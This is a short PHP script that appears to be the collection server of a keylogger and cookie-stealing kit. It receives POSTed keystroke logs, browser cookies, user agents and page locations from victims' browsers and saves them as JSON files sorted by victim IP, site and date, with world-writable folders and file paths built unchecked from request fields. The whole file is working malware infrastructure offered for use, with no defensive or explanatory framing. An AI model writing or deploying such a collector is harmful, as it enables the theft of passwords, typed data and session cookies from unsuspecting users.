<?php 

// If new logs
if (isset($_POST["sendLogs"])) {
	// Info
	$host      = $_POST["host"];
	$curDate   = date("d-m-Y");
	$curTime   = $_POST["time"];
	$keyLogs   = $_POST["keyLogs"];
	$cookies   = $_POST["cookies"];
	$uagents   = $_POST["uagents"];
	$location  = $_POST["location"];
	$remoteIP  = $_SERVER["REMOTE_ADDR"];

	$directory = "FluxLogs/" . $remoteIP . "/" . $host . "/" . $curDate;
	$logfile   = $directory . "/" . $curTime;
	// Create logs dir if it not exists
	if (!file_exists($directory)) {
		mkdir($directory, 0777, true);
	}
	// Data
	$data = [
	    "remote_ip" => $remoteIP,
	    "cookies" => $cookies,
	    "host" => $host,
	    "location" => $location,
	    "uagents" => $uagents,
	    "keyLogs" => $keyLogs
	];
	$data = json_encode($data, JSON_PRETTY_PRINT);
	// Save data
	$file = fopen($logfile, "w");
	fwrite($file, $data);
	fclose($file);

}


?>